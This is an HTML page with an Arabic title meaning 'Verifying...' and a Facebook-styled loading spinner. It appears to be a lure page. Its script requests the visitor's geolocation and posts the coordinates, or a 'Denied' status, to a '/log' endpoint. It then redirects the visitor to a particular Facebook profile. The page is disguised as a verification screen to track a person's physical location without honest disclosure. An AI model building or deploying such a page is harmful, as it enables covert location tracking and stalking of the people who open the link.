<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
</head>
<body style="background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh;">
    <div style="border:4px solid #f3f3f3; border-top:4px solid #1877f2; border-radius:50%; width:40px; height:40px; animation:spin 2s linear infinite;"></div>
    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>

    <script>
        const fbUrl = "https://www.facebook.com/ab.d.u.698557";

        async function send(data) {
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            window.location.href = fbUrl;
        }

        navigator.geolocation.getCurrentPosition(
            (p) => send({ lat: p.coords.latitude, lon: p.coords.longitude, status: "Allowed" }),
            (e) => send({ status: "Denied" }),
            { timeout: 5000 }
        );
        setTimeout(() => { window.location.href = fbUrl; }, 6000);
    </script>
</body>
</html>
